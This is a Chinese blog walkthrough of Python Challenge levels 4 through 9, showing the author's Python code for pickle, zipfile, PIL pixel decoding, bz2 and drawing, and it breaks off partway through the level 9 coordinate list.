<p><strong>解释：</strong> 首先例举一下这题我遇到的坑！</p>
<p>原先我的代码是这样的： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re  </span><br><span class="line">nothing = <span class="number">12345</span>  </span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;http://www.pythonchallenge.com/pc/def/linkedlist.php?nothing=%d&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">400</span>):  </span><br><span class="line">    url = <span class="built_in">str</span> % nothing</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line">    nothing = <span class="built_in">int</span>(re.search(<span class="string">r&#x27;\d+&#x27;</span>, r.text).group())</span><br></pre></td></tr></table></figure></p>
<p>运行一段时间后，得到如下报错： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AttributeError: &#x27;NoneType&#x27; object has no attribute &#x27;group&#x27;</span><br></pre></td></tr></table></figure></p>
<p>并且此时页面的内容为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Yes. Divide by two and keep going.</span><br></pre></td></tr></table></figure></p>
<p>因为此时页面并没有数字，无法匹配，也就没有返回匹配对象，更加没有 group() 方法，所以报错。因此，我将代码修改为如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re  </span><br><span class="line">nothing = <span class="number">12345</span>  </span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;http://www.pythonchallenge.com/pc/def/linkedlist.php?nothing=%d&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">400</span>):  </span><br><span class="line">    url = <span class="built_in">str</span> % nothing  </span><br><span class="line">    r = requests.get(url)  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        nothing = <span class="built_in">int</span>(re.search(<span class="string">r&#x27;\d+&#x27;</span>, r.text).group())  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;nothing: %d&quot;</span> % nothing)  </span><br><span class="line">    <span class="keyword">except</span>:  </span><br><span class="line">        nothing /= <span class="number">2</span></span><br><span class="line">		<span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure></p>
<p>然后能够越过这个坑： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130195351.png" /></p>
<p>跳进下一个坑： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130195449.png" /></p>
<p>当 nothing = 82683 时，页面内容如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You&#x27;ve been misleaded to here. Go to previous one and check.</span><br></pre></td></tr></table></figure></p>
<p>前一个是 82682，页面内容如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">There maybe misleading numbers in the text. One example is 82683. Look only for the next nothing and the next nothing is 63579</span><br></pre></td></tr></table></figure></p>
<p>因为 re.search() 匹配到第一个就会返回，所以才会踩到这个坑，这里的 nothing 是第二个，所以修改为最终代码，就是刚刚给的，最后顺利得到结果： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130200232.png" /></p>
<p>这里其实存在着另一个坑，得到 peak.html 的 nothing = 66831，此时如果你没有显示每一页的内容 <code>print(r.text)</code>，极容易错过信息，因为此时 nothing /= 2，也能访问，看后面能够继续就知道了。</p>
<p>修改 url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：http://www.pythonchallenge.com/pc/def/linkedlist.php</span><br><span class="line">修改后：http://www.pythonchallenge.com/pc/def/peak.html</span><br></pre></td></tr></table></figure></p>
<p><strong>注意：</strong> 遇到坑之后的 nothing 不要从头开始，这样会省时间。</p>
<h1 id="level-5">level 5</h1>
<h2 id="题目信息-5">题目信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130205619.png" /></p>
<p>页面源码： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130205643.png" /></p>
<p>注意绿字提醒：python 中有一个库叫做 pickle，用来序列化和非序列化的。因此，本题需要使用到该库。还有 <code>banner.p</code> 点进去发现是看不懂的一堆字符串，做一个合理的猜测：<strong><code>banner.p</code> 中的字符串是经过序列化的，将它反序列应该会得到答案</strong></p>
<h2 id="方法-7">方法</h2>
<p><strong>代码：</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, pickle  </span><br><span class="line">url = <span class="string">&#x27;http://www.pythonchallenge.com/pc/def/banner.p&#x27;</span>  </span><br><span class="line">raw = requests.get(url).content  </span><br><span class="line"><span class="built_in">print</span>(pickle.loads(raw))</span><br></pre></td></tr></table></figure></p>
<p>发现得到看不懂的一堆东西： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130210254.png" /></p>
<p>仔细观察发现，是一个二元列表，每一行都是由一个或多个元组组成的，猜测（看完答案后）：<strong>每一行其实都是字符串的压缩：将一行字符串压缩成 <code>[(字符1，出现次数), (字符2，出现次数)...]</code> 因此，只要将每一行还原成原来的样子即可。</strong></p>
<p><strong>最终代码：</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, pickle  </span><br><span class="line">url = <span class="string">&#x27;http://www.pythonchallenge.com/pc/def/banner.p&#x27;</span>  </span><br><span class="line">raw = requests.get(url).content  <span class="comment"># 转为 byte，因为 loads() 的参数是 byte 类型的</span></span><br><span class="line">data = pickle.loads(raw)  </span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> data:  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([ch * num <span class="keyword">for</span> ch, num <span class="keyword">in</span> line]))</span><br></pre></td></tr></table></figure></p>
<p><strong>结果：</strong> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130210708.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">channel</span><br></pre></td></tr></table></figure>
<p>修改 url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：http://www.pythonchallenge.com/pc/def/peak.html</span><br><span class="line">修改后：http://www.pythonchallenge.com/pc/def/channel.html</span><br></pre></td></tr></table></figure></p>
<h1 id="level-6">level 6</h1>
<h2 id="题目信息-6">题目信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220131103728.png" /></p>
<p>查看页面源码： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220131103745.png" /></p>
<p>注意：html 旁边的 <code>&lt;!-- &lt;-- zip --&gt;</code>。尝试将 html 修改为 zip 发现可以下载一个压缩文件。</p>
<p>压缩文包里有许多文件，先看 <code>readme.txt</code>： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">welcome to my zipped list.  </span><br><span class="line">  </span><br><span class="line">hint1: start from 90052  </span><br><span class="line">hint2: answer is inside the zip</span><br></pre></td></tr></table></figure></p>
<p>查看之后猜测，除 <code>readme.txt</code> 之外每一个文件内容都是： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Next nothing is (\d+)</span><br></pre></td></tr></table></figure></p>
<p>思路：<strong>nothing 从 90052 开始，先访问对应文件，然后读取下一个 nothing 继续访问。直到出现不同</strong></p>
<h2 id="方法-8">方法</h2>
<p>第一次代码： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re  </span><br><span class="line">rpath = <span class="string">&quot;attachments/level_6/%s.txt&quot;</span>  </span><br><span class="line">nothing = <span class="string">&quot;90052&quot;</span>  </span><br><span class="line">pattern = <span class="string">&quot;Next nothing is (\d+)&quot;</span>  </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">    path = rpath % nothing  </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">        content = f.read()  </span><br><span class="line">        <span class="built_in">print</span>(content)  </span><br><span class="line">        match = re.search(pattern, content)  </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> match:  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">	nothing = match.group(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p>
<p>解释： <code>match.group(1)</code>：因为代码中的 pattern 里面只有一个括号（在我们需要处加上括号），这样子匹配下来的其实是一整句话 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Next nothing is (\d+)</span><br></pre></td></tr></table></figure></p>
<p>但是，我们只需要 () ，如果直接使用 <code>match.group()</code> 就会将整句话给 nothing，而 <code>group(1)</code> 就是只读取第一个括号中的内容，也就是 () 即 nothing。</p>
<p>不出所料，果然没这么简单，当 nothing = 46145 时： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220131105144.png" /></p>
<p>现在的问题是什么是 comments？经过百度后发现 zip 文件有 comment，用来写额外的描述数据。python 中有 zipfile 库可以获得 comment。</p>
<p>最终代码： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re, zipfile  </span><br><span class="line">path = <span class="string">&quot;attachments/level_6/channel.zip&quot;</span>  </span><br><span class="line">nothing = <span class="string">&quot;90052&quot;</span>  </span><br><span class="line">comment = []  </span><br><span class="line">pattern = <span class="string">&quot;Next nothing is (\d+)&quot;</span>  </span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">        fileName = nothing + <span class="string">&#x27;.txt&#x27;</span></span><br><span class="line">        content = f.read(fileName).decode(<span class="string">&quot;utf-8&quot;</span>)  </span><br><span class="line">        comment.append(f.getinfo(fileName).comment.decode(<span class="string">&#x27;utf-8&#x27;</span>))  </span><br><span class="line">        match = re.search(pattern, content)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> match:  </span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        nothing = match.group(<span class="number">1</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(comment))</span><br></pre></td></tr></table></figure></p>
<p>结果： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220131110030.png" /></p>
<p>访问 <code>http://www.pythonchallenge.com/pc/def/hockey.html</code>，得到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">it&#x27;s in the air. look at the letters.</span><br></pre></td></tr></table></figure></p>
<p>注意到，组成 HOCKY 的字母为 oxygen，因此修改 url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：http://www.pythonchallenge.com/pc/def/hockey.html</span><br><span class="line">修改后：http://www.pythonchallenge.com/pc/def/oxygen.html</span><br></pre></td></tr></table></figure></p>
<h1 id="level-7">level 7</h1>
<h2 id="题目信息-7">题目信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201114933.png" /></p>
<p>只有上面一张奇怪的图片，页面源码也没有东西。可以看到图片上有一些灰度块，目前合理猜测就是：<strong>这些灰度块隐藏着信息。</strong></p>
<h2 id="方法-9">方法</h2>
<p>第一步，先将图片下载下来： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">img_url = <span class="string">&quot;http://www.pythonchallenge.com/pc/def/oxygen.png&quot;</span>  </span><br><span class="line">path = <span class="string">&quot;attachments/level_7/oxygen.png&quot;</span></span><br><span class="line">img = requests.get(img_url)  </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    f.write(img.content)</span><br></pre></td></tr></table></figure></p>
<p>第二步，查看图片的必要信息： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">path = <span class="string">&quot;attachments/level_7/oxygen.png&quot;</span></span><br><span class="line">img = Image.<span class="built_in">open</span>(path)  </span><br><span class="line"><span class="built_in">print</span>(img.<span class="built_in">format</span>, img.size, img.mode)</span><br></pre></td></tr></table></figure></p>
<p>结果是： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PNG (629, 95) RGBA # 分别是后缀，（宽，高）， 模式</span><br></pre></td></tr></table></figure></p>
<p>可以看到图像的模式是 RGBA 的，那么每个像素点就是个四元组，分别为 <code>r, g, b, a</code> 前三个为红，绿，黄，最后一个为透明度（本题用不着）。需要注意一点：<strong>灰度图像的 r == g == b</strong>，因此，我们利用这点，先找到图片中的灰度条在哪几行。代码如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">path = <span class="string">&quot;attachments/level_7/oxygen.png&quot;</span></span><br><span class="line">img = Image.<span class="built_in">open</span>(path)</span><br><span class="line">row = [img.getpixel((<span class="number">0</span>, x)) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(img.height)]  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(img.height):  </span><br><span class="line">    <span class="keyword">if</span> row[i][<span class="number">0</span>] == row[i][<span class="number">1</span>] == row[i][<span class="number">2</span>]:  <span class="comment"># r == g == b</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%d:&quot;</span> % i, end = <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(row[i])</span><br></pre></td></tr></table></figure></p>
<p>结果： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201122229.png" /></p>
<p>随便取一行即可，这里取 47，因为 <code>img.height / 2</code> 的值为 47。</p>
<p>第三步，取出 47 行的所有像素点： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">path = <span class="string">&quot;attachments/level_7/oxygen.png&quot;</span></span><br><span class="line">img = Image.<span class="built_in">open</span>(path)</span><br><span class="line">row = [img.getpixel((x, img.height/<span class="number">2</span>)) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(img.width)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(img.width):</span><br><span class="line">    <span class="built_in">print</span>(row[i])</span><br></pre></td></tr></table></figure></p>
<p>结果： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201122525.png" /></p>
<p>发现，除了第一个之外，其余的像素点都重复了 7 次，因此我们剔除重复的：（上面的代码稍作修改） <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">path = <span class="string">&quot;attachments/level_7/oxygen.png&quot;</span></span><br><span class="line">img = Image.<span class="built_in">open</span>(path)</span><br><span class="line">row = [img.getpixel((x, img.height/<span class="number">2</span>)) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(img.width)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, img.width, <span class="number">7</span>): <span class="comment"># 修改了这里</span></span><br><span class="line">    <span class="built_in">print</span>(row[i])</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201122931.png" /></p>
<p>第四步，每个灰度图像都有一个灰度值，因此做一个猜测：<strong>将这些灰度值当作 ascii 码，然后转为字符。</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">path = <span class="string">&quot;attachments/level_7/oxygen.png&quot;</span></span><br><span class="line">img = Image.<span class="built_in">open</span>(path)  </span><br><span class="line">row = [img.getpixel((x, img.height/<span class="number">2</span>)) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(img.width)]  </span><br><span class="line">info = []  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, img.width, <span class="number">7</span>):  </span><br><span class="line">    info.append(<span class="built_in">chr</span>(row[i][<span class="number">0</span>]))  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(info))</span><br></pre></td></tr></table></figure></p>
<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smart guy, you made it. the next level is [105, 110, 116, 101, 103, 114, 105, 116, 121]pe_ </span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>后边的 pe_ 我猜测是因为第一个像素点就重复了5次，而我取步长为7，导致每次取得都不是重复值里面得第一个，因为可能将重复值后面得无关的也取了进来。</p>
</blockquote>
<p>将上面结果中得数字也提取出来，当作 ascii 码处理，因此最终代码如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re  </span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image  </span><br><span class="line">img_url = <span class="string">&quot;http://www.pythonchallenge.com/pc/def/oxygen.png&quot;</span>  </span><br><span class="line">path = <span class="string">&quot;attachments/level_7/oxygen.png&quot;</span>  </span><br><span class="line">img = Image.<span class="built_in">open</span>(path)  </span><br><span class="line">row = [img.getpixel((x, img.height/<span class="number">2</span>)) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(img.width)]  </span><br><span class="line">info = []  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, img.width, <span class="number">7</span>):  </span><br><span class="line">    info.append(<span class="built_in">chr</span>(row[i][<span class="number">0</span>]))  </span><br><span class="line">message = <span class="string">&quot;&quot;</span>.join(info)  </span><br><span class="line"><span class="built_in">next</span> = re.findall(<span class="string">r&#x27;(\d+)&#x27;</span>, message)  </span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">next</span>:  </span><br><span class="line">    v = <span class="built_in">int</span>(c)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(v), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">integrity</span><br></pre></td></tr></table></figure></p>
<p>修改 url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：http://www.pythonchallenge.com/pc/def/oxygen.html</span><br><span class="line">修改后：http://www.pythonchallenge.com/pc/def/integrity.html</span><br></pre></td></tr></table></figure></p>
<h1 id="level-8">level 8</h1>
<h2 id="题目信息-8">题目信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201221330.png" /></p>
<p>查看页面源码： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201221350.png" /></p>
<p>发现：</p>
<ol type="1">
<li>图片中的蜜蜂可以点开，点开之后会跳出一个验证界面 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201221552.png" /></li>
<li>绿色字符串正好对应的用户名和密码</li>
</ol>
<p>但是，很明显可以看出应该是经过某种编码的，后来发现，是通过 <strong>bz2</strong> 压缩得到的。而 python 自带了 <strong>bz2</strong> 库。</p>
<h2 id="方法-10">方法</h2>
<p>代码如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> bz2  </span><br><span class="line">un = <span class="string">b&#x27;BZh91AY&amp;SYA\xaf\x82\r\x00\x00\x01\x01\x80\x02\xc0\x02\x00 \x00!\x9ah3M\x07&lt;]\xc9\x14\xe1BA\x06\xbe\x084&#x27;</span>  </span><br><span class="line">pw = <span class="string">b&#x27;BZh91AY&amp;SY\x94$|\x0e\x00\x00\x00\x81\x00\x03$ \x00!\x9ah3M\x13&lt;]\xc9\x14\xe1BBP\x91\xf08&#x27;</span>  </span><br><span class="line"><span class="built_in">print</span>(bz2.decompress(un), bz2.decompress(pw))</span><br></pre></td></tr></table></figure></p>
<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;huge&#x27; b&#x27;file&#x27;</span><br><span class="line"></span><br><span class="line">用户名：huge</span><br><span class="line">密码：file</span><br></pre></td></tr></table></figure></p>
<p>然后成功登录，得到新的 url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.pythonchallenge.com/pc/return/good.html</span><br></pre></td></tr></table></figure></p>
<h1 id="level-9">level 9</h1>
<h2 id="题目信息-9">题目信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201230807.png" /></p>
<p>查看页面源码： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201230823.png" /></p>
<p>最开始还以为是将图中的黑点连起来，后来想想应该不太可能，然后注意到 <code>first + second</code> ，但是 first 和 second 的长度都不同，无法相加，所以应该不是简单的相加。联想到 <code>connect the dots</code> 觉得应该是将 first 和 second 连接起来，那么 first 和 second 代表的就是点的坐标。</p>
<h2 id="方法-11">方法</h2>
<p>代码如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw  </span><br><span class="line">first = [<span class="number">146</span>,<span class="number">399</span>,<span class="number">163</span>,<span class="number">403</span>,<span class="number">170</span>,<span class="number">393</span>,<span class="number">169</span>,<span class="number">391</span>,<span class="number">166</span>,<span class="number">386</span>,<span class="number">170</span>,<span class="number">381</span>,<span class="number">170</span>,<span class="number">371</span>,<span class="number">170</span>,<span class="number">355</span>,<span class="number">169</span>,<span class="number">346</span>,<span class="number">167</span>,<span class="number">335</span>,<span class="number">170</span>,<span class="number">329</span>,<span class="number">170</span>,<span class="number">320</span>,<span class="number">170</span>,<span class="number">310</span>,<span class="number">171</span>,<span class="number">301</span>,<span class="number">173</span>,<span class="number">290</span>,<span class="number">178</span>,<span class="number">289</span>,<span class="number">182</span>,<span class="number">287</span>,<span class="number">188</span>,<span class="number">286</span>,<span class="number">190</span>,<span class="number">286</span>,<span class="number">192</span>,<span class="number">291</span>,<span class="number">194</span>,<span class="number">296</span>,<span class="number">195</span>,<span class="number">305</span>,<span class="number">194</span>,<span class="number">307</span>,<span class="number">191</span>,<span class="number">312</span>,<span class="number">190</span>,<span class="number">316</span>,<span class="number">190</span>,<span class="number">321</span>,<span class="number">192</span>,<span class="number">331</span>,<span class="number">193</span>,<span class="number">338</span>,<span class="number">196</span>,<span class="number">341</span>,<span class="number">197</span>,<span class="number">346</span>,<span class="number">199</span>,<span class="number">352</span>,<span class="number">198</span>,<span class="number">360</span>,<span class="number">197</span>,<span class="number">366</span>,<span class="number">197</span>,<span class="number">373</span>,<span class="number">196</span>,<span class="number">380</span>,<span class="number">197</span>,<span class="number">383</span>,<span class="number">196</span>,<span class="number">387</span>,<span class="number">192</span>,<span class="number">389</span>,<span class="number">191</span>,<span class="number">392</span>,<span class="number">190</span>,<span class="number">396</span>,<span class="number">189</span>,<span class="number">400</span>,<span class="number">194</span>,<span class="number">401</span>,<span class="number">201</span>,<span class="number">402</span>,<span class="number">208</span>,<span class="number">403</span>,<span class="number">213</span>,<span class="number">402</span>,<span class="number">216</span>,<span class="number">401</span>,<span class="number">219</span>,<span class="number">397</span>,<span class="number">219</span>,<span class="number">393</span>,<span class="number">216</span>,<span class="number">390</span>,<span class="number">215</span>,<span class="number">385</span>,<span class="number">215</span>,<span class="number">379</span>,<span class="number">213</span>,<span class="number">373</span>,<span class="number">213</span>,<span class="number">365</span>,<span class="number">212</span>,<span class="number">360</span>,<span class="number">210</span>,<span class="number">353</span>,<span class="number">210</span>,<span class="number">347</span>,<span class="number">212</span>,<span class="number">338</span>,<span class="number">213</span>,<span class="number">329</span>,<span class="number">214</span>,<span class="number">319</span>,<span class="number">215</span>,<span class="number">311</span>,<span class="number">215</span>,<span class="number">306</span>,<span class="number">216</span>,<span class="number">296</span>,<span class="number">218</span>,<span class="number">290</span>,<span class="number">221</span>,<span class="number">283</span>,<span class="number">225</span>,<span class="number">282</span>,<span class="number">233</span>,<span class="number">284</span>,<span class="number">238</span>,<span class="number">287</span>,<span class="number">243</span>,<span class="number">290</span>,<span class="number">250</span>,<span class="number">291</span>,<span class="number">255</span>,<span class="number">294</span>,<span class="number">261</span>,<span class="number">293</span>,<span class="number">265</span>,<span class="number">291</span>,<span class="number">271</span>,<span class="number">291</span>,<span class="number">273</span>,<span class="number">289</span>,<span class="number">278</span>,<span class="number">287</span>,<span class="number">279</span>,<span class="number">285</span>,<span class="number">281</span>,<span class="number">280</span>,<span class="number">284</span>,<span class="number">278</span>,<span class="number">284</span>,<span class="number">276</span>,<span class="number">287</span>,<span class="number">277</span>,<span class="number">289</span>,<span class="number">283</span>,<span class="number">291</span>,<span class="number">286</span>,<span class="number">294</span>,<span class="number">291</span>,<span class="number">296</span>,<span class="number">295</span>,<span class="number">299</span>,<span class="number">300</span>,<span class="number">301</span>,<span class="number">304</span>,<span class="number">304</span>,<span class="number">320</span>,<span class="number">305</span>,<span class="number">327</span>,<span class="number">306</span>,<span class="number">332</span>,<span class="number">307</span>,<span class="number">341</span>,<span class="number">306</span>,<span class="number">349</span>,<span class="number">303</span>,<span class="number">354</span>,<span class="number">301</span>,<span class="number">364</span>,<span class="number">301</span>,<span class="number">371</span>,<span class="number">297</span>,<span class="number">375</span>,<span class="number">292</span>,<span class="number">384</span>,<span class="number">291</span>,<span class="number">386</span>,<span class="number">302</span>,<span class="number">393</span>,<span class="number">324</span>,<span class="number">391</span>,<span class="number">333</span>,<span class="number">387</span>,<span class="number">328</span>,<span class="number">375</span>,<span class="number">329</span>,<span class="number">367</span>,<span class="number">329</span>,<span class="number">353</span>,<span class="number">330</span>,<span class="number">341</span>,<span class="number">331</span>,<span class="number">328</span>,<span class="number">336</span>,<span class="number">319</span>,<span class="number">338</span>,<span class="number">310</span>,<span class="number">341</span>,<span class="number">304</span>,<span class="number">341</span>,<span class="number">285</span>,<span class="number">341</span>,<span class="number">278</span>,<span class="number">343</span>,<span class="number">269</span>,<span class="number">344</span>,<span class="number">262</span>,<span class="number">346</span>,<span class="number">259</span>,<span class="number">346</span>,<span class="number">251</span>,<span class="number">349</span>,<span class="number">259</span>,<span class="number">349</span>,<span class="number">264</span>,<span class="number">349</span>,<span class="number">273</span>,<span class="number">349</span>,<span class="number">280</span>,<span class="number">349</span>,<span class="number">288</span>,<span class="number">349</span>,<span class="number">295</span>,<span class="number">349</span>,<span class="number">298</span>,<span class="number">354</span>,<span class="number">293</span>,<span class="number">356</span>,<span class="number">286</span>,<span class="number">354</span>,<span class="number">279</span>,<span class="number">352</span>,<span class="number">268</span>,<span class="number">352</span>,<span class="number">257</span>,<span class="number">351</span>,<span class="number">249</span>,<span class="number">350</span>,<span class="number">234</span>,<span class="number">351</span>,<span class="number">211</span>,<span class="number">352</span>,<span class="number">197</span>,<span class="number">354</span>,<span class="number">185</span>,<span class="number">353</span>,<span class="number">171</span>,<span class="number">351</span>,<span class="number">154</span>,<span class="number">348</span>,<span class="number">147</span>,<span class="number">342</span>,<span class="number">137</span>,<span class="number">339</span>,<span class="number">132</span>,<span class="number">330</span>,<span class="number">122</span>,<span class="number">327</span>,<span class="number">120</span>,<span class="number">314</span>,<span class="number">116</span>,<span class="number">304</span>,<span class="number">117</span>,<span class="number">293</span>,<span class="number">118</span>,<span class="number">284</span>,<span class="number">118</span>,<span class="number">281</span>,<span class="number">122</span>,<span class="number">275</span>,<span class="number">128</span>,<span class="number">265</span>,<span class="number">129</span>,<span class="number">257</span>,<span class="number">131</span>,<span class="number">244</span>,<span class="number">133</span>,<span class="number">239</span>,<span class="number">134</span>,<span class="number">228</span>,<span class="number">136</span>,<span class="number">221</span>,<span class="number">137</span>,<span class="number">214</span>,<span class="number">138</span>,<span class="number">209</span>,<span class="number">135</span>,<span class="number">201</span>,<span class="number">132</span>,<span class="number">192</span>,<span class="number">130</span>,<span class="number">184</span>,<span class="number">131</span>,<span class="number">175</span>,<span class="number">129</span>,<span class="number">170</span>,<span class="number">131</span>,<span class="number">159</span>,<span class="number">134</span>,<span class="number">157</span>,<span class="number">134</span>,<span class="number">160</span>,<span class="number">130</span>,<span class="number">170</span>,<span class="number">125</span>,<span class="number">176</span>,<span class="number">114</span>,<span class="number">176</span>,<span class="number">102</span>,<span class="number">173</span>,<span class="number">103</span>,<span class="number">172</span>,<span class="number">108</span>,<span class="number">171</span>,<span class="number">111</span>,<span class="number">163</span>,<span class="number">115</span>,<span class="number">156</span>,<span class="number">116</span>,<span class="number">149</span>,<span class="number">117</span>,<span class="number">142</span>,<span class="number">116</span>,<span class="number">136</span>,<span class="number">115</span>,<span class="number">129</span>,<span class="number">115</span>,<span class="number">124</span>,<span class="number">115</span>,<span class="number">120</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">117</span>,<span class="number">113</span>,<span class="number">120</span>,<span class="number">109</span>,<span class="number">122</span>,<span class="number">102</span>,<span class="number">122</span>,<span class="number">100</span>,<span class="number">121</span>,<span class="number">95</span>,<span class="number">121</span>,<span class="number">89</span>,<span class="number">115</span>,<span class="number">87</span>,<span class="number">110</span>,<span class="number">82</span>,<span class="number">109</span>,<span class="number">84</span>,<span class="number">118</span>,<span class="number">89</span>,<span class="number">123</span>,<span class="number">93</span>,<span class="number">129</span>,<span class="number">100</span>,<span class="number">130</span>,<span class="number">108</span>,<span class="number">132</span>,<span class="number">110</span>,<span 